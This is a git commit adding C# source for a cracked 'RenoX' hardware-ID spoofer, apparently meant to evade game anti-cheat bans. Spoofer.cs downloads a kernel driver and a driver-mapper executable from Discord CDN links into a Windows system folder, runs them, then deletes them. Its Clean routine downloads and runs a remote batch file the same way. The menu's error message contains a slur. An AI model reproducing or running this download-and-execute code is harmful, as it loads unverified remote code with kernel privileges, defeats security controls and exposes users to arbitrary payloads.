30d706e559b4d847a2f0fab09ff81a93eefba447
Skxxet <71569118+Skxxet@users.noreply.github.com>
2020-09-19 22:25:58 +0200

    Add files via upload

---
+++ ClientSpoofer/ClientSpoofer/Program.cs
@@ -0,0 +1,58 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace ClientSpoofer
+{
+    class Program
+    {
+            private static void Main(string[] args)
+            {
+                while (true)
+                {
+                    Console.ForegroundColor = ConsoleColor.Blue;
+                    Console.Title = "RenoX Spoofer source cracked by Skeet | RenoX#6687";
+                    Console.WriteLine(" ██▀███  ▓█████  ███▄    █  ▒█████  ▒██   ██▒     ██████  ██▓███   ▒█████   ▒█████    █████▒▓█████  ██▀███  \n▓██ ▒ ██▒▓█   ▀  ██ ▀█   █ ▒██▒  ██▒▒▒ █ █ ▒░   ▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒▓██   ▒ ▓█   ▀ ▓██ ▒ ██▒\n▓██ ░▄█ ▒▒███   ▓██  ▀█ ██▒▒██░  ██▒░░  █   ░   ░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▒████ ░ ▒███   ▓██ ░▄█ ▒\n▒██▀▀█▄  ▒▓█  ▄ ▓██▒  ▐▌██▒▒██   ██░ ░ █ █ ▒      ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░░▓█▒  ░ ▒▓█  ▄ ▒██▀▀█▄  \n░██▓ ▒██▒░▒████▒▒██░   ▓██░░ ████▓▒░▒██▒ ▒██▒   ▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░░▒█░    ░▒████▒░██▓ ▒██▒\n░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ░    ░░ ▒░ ░░ ▒▓ ░▒▓░\n  ░▒ ░ ▒░ ░ ░  ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░   ░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░  ░       ░ ░  ░  ░▒ ░ ▒░\n  ░░   ░    ░      ░   ░ ░ ░ ░ ░ ▒   ░    ░     ░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░       ░     ░░   ░ \n   ░        ░  ░         ░     ░ ░   ░    ░           ░               ░ ░      ░ ░             ░  ░   ░     ");
+                    Console.ForegroundColor = ConsoleColor.Red;
+                    Console.WriteLine("[+] cracked by skeet ,Made by RenoX#6687");
+                    Console.WriteLine();
+                    Console.WriteLine("[+] [1] Spoof");
+                    Console.WriteLine();
+                    Console.WriteLine("[+] [2] Clean");
+                    Console.WriteLine();
+                    Console.WriteLine("[+] [3] Discord");
+                    Console.WriteLine();
+                    Console.Write(" > ");
+                    string str = Console.ReadLine();
+                    if (str == "1")
+                    {
+                        int num1 = (int)MessageBox.Show("Spoof");
+                        Spoofer.Spoof();
+                        int num2 = (int)MessageBox.Show("Spoofed");
+                    }
+                    else if (str == "2")
+                    {
+                        int num = (int)MessageBox.Show("to Clean Press: 8");
+                        Spoofer.Clean();
+                    }
+                    else if (str == "3")
+                    {
+                        Console.Clear();
+                        Process.Start("https://discord.gg/Qh38cEd");
+                    }
+                    else
+                    {
+                        Console.Clear();
+                        Console.WriteLine("Wrong Button Retard");
+                        Thread.Sleep(2000);
+                        Console.Clear();
+                    }
+                }
+            }
+        }
+    }
---
+++ ClientSpoofer/ClientSpoofer/Spoofer.cs
@@ -0,0 +1,53 @@
+﻿using System.Diagnostics;
+using System.Net;
+using System.Threading;
+
+namespace ClientSpoofer
+{
+    internal class Spoofer
+    {
+        public static void Spoof()
+        {
+            WebClient webClient = new WebClient();
+            string str1 = "C:\\Windows\\IME\\mapper.exe";
+            string str2 = "C:\\Windows\\IME\\spoof.sys";
+            webClient.DownloadFile("https://cdn.discordapp.com/attachments/651522382200176690/660983927883825163/spoofer.sys", str2);
+            webClient.DownloadFile("https://cdn.discordapp.com/attachments/651522382200176690/660984792061313024/mapper_3.exe", str1);
+            Process process1 = new Process()
+            {
+                StartInfo = {
+          FileName = "cmd.exe",
+          UseShellExecute = true,
+          CreateNoWindow = true,
+          WindowStyle = ProcessWindowStyle.Hidden
+        }
+            };
+            Process process2 = Process.Start(str1, str2);
+            Thread.Sleep(1000);
+            process2.Close();
+            System.IO.File.Delete(str2);
+            System.IO.File.Delete(str1);
+        }
+
+        public static void Clean()
+        {
+            WebClient webClient = new WebClient();
+            string str = "C:\\Windows\\IME\\Run_me.bat";
+            string fileName = str;
+            webClient.DownloadFile("https://cdn.discordapp.com/attachments/727855516965011548/731227744750272623/Run_me.bat", fileName);
+            Process process1 = new Process()
+            {
+                StartInfo = {
+          FileName = "cmd.exe",
+          UseShellExecute = true,
+          CreateNoWindow = true,
+          WindowStyle = ProcessWindowStyle.Hidden
+        }
+            };
+            Process process2 = Process.Start(str);
+            Thread.Sleep(1000);
+            process2.Close();
+            System.IO.File.Delete(str);
+        }
+    }
+}
